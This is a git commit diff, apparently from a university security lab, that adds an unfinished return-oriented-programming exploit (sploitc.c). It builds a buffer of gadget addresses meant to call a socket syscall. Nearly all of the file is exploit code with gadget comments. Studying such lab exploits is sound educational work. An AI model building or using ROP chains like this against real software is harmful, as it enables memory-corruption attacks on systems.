4c07e8243725650c35c4c487473ba49290d78c08
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-30 01:15:32 -0500

    FINISHED SPLOITB, initial commit of sploitc

--- lab4/sploitc.c
+++ lab4/sploitc.c
@@ -7,6 +7,99 @@
 
 int main(void)
 {
+  char bufr[700]; // address = 0xbfbf671d
+  char trap[] = "\xe5\xb6\xa9\xbb";
+
+  char pop_eax[] = "\xe1\xa0\xb9\xbb";
+  char pop_edx[] = "\x1b\xdc\xb9\xbb";
+  char pop_ecx[] = "\x22\xa4\xba\xbb";
+
+  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
+  char xor_edx[] = "\xd4\xbe\xb3\xbb";
+
+  char and_eax_edx[] = "\x8a\xe9\xb3\xbb";
+
+  char add_dl_al[] = "\x07\x46\xbb\xbb";
+  char add_cl_ah[] = "\xd7\xbd\xa7\xbb";
+  
+  char inc_edx[] = "\x8a\xb8\xb7\xbb";
+
+  char dec_ecx[] = "\x17\xe7\xb7\xbb";
+
+  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb";
+  char write_at_edx_from_eax[] = "\x79\x2d\xb5\xbb";
+
+  char jump_8[] = "\xe2\xd3\xb2\xbb";
+  char jump_12[] = "\x68\x8b\xaa\xbb";
+  char jump_16[] = "\x2a\x01\xad\xbb";
+
+  char dummy_ret[] = "\x9c\x36\xa7\xbb";
+
+  // _socket30 syscall
+  char socket_arg1[] = "\x8a\x01\x01\x01";
+  char socket_arg2[] = "\x01\x01\x01\x01";
+
+  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2, bufr + 231
+  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1, bufr + 235
+  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239
+
+  int i;
+  // Fill up buffer
+  for(i = 0; i < 131; i++)
+    memcpy(bufr + i, "\x01",1);
+  //----------------------------------------------------------------------------------------- _socket30
+  // get first 8 bits of socket arg-> 8a
+  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 135, socket_arg1);
+  // get next 8 bits of socket arg-> 01
+  strcpy(bufr + 139, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 143, socket_arg2);
+  // clear eax
+  strcpy(bufr + 147, xor_eax); // 0xbba9b3c2
+  // add first 8 bits of arg
+  strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
+  // add next 8 bits of arg
+  strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
+                                 // eax now holds 394-> 18a
+  // prepare stack with 3 args for socket syscall
+  // clear edx
+  strcpy(bufr + 159, xor_edx); // 0xbbb3bed4
+  // increment ecx to 2
+  strcpy(bufr + 163, inc_edx); // 0xbbb7b88a
+  strcpy(bufr + 167, inc_edx); // 0xbbb7b88a
+  // pop first address of args -> 2
+  strcpy(bufr + 171, pop_ecx); // 0xbbaa422 dec_ecx
+  strcpy(bufr + 175, socket_stack_arg1_address); // -> 0xbfbf6804
+  // dummy gadget to avoid null character in address
+  strcpy(bufr + 179, dummy_ret);
+  strcpy(bufr + 183, write_at_ecx_from_edx); // 0xbbb6b87e
+  // clear edx
+  strcpy(bufr + 187, xor_edx); // 0xbbb3bed4
+  // increment edx to 1
+  strcpy(bufr + 191, inc_edx); // 0xbbb7b88a
+  // pop second address of args -> 1
+  strcpy(bufr + 195, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 199, socket_stack_arg2_address); // -> 0xbfbf6808
+  strcpy(bufr + 203, write_at_ecx_from_edx); // 0xbbb6b87e
+  // clear edx
+  strcpy(bufr + 207, xor_edx); // 0xbbb3bed4
+  // pop third address of args -> 0
+  strcpy(bufr + 211, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 215, socket_stack_arg3_address); // -> 0xbfbf680c
+  strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e
+
+  // trap into the kernel for _socket30 syscall
+  strcpy(bufr + 223, trap);  // 0xbba9b6e5, location is 0xbfbf67fc
+  // jump 12 bytes to next gadget
+  strcpy(bufr + 227, jump_12); // 0xbbaa8b68
+  // socket arg 1 -> 2
+  strcpy(bufr + 231, "\x01\x01\x01\x01");
+  // socket arg 2 -> 1
+  strcpy(bufr + 235, "\x01\x01\x01\x01");
+  // socket arg 3 -> 0
+  strcpy(bufr + 239, "\x01\x01\x01\x01");
+  // ------------------------------------------------------------------------------- store fd in stack
+  
   writecmd(PIPEPATH, "Hello from sploitc!");
   
   return 0;
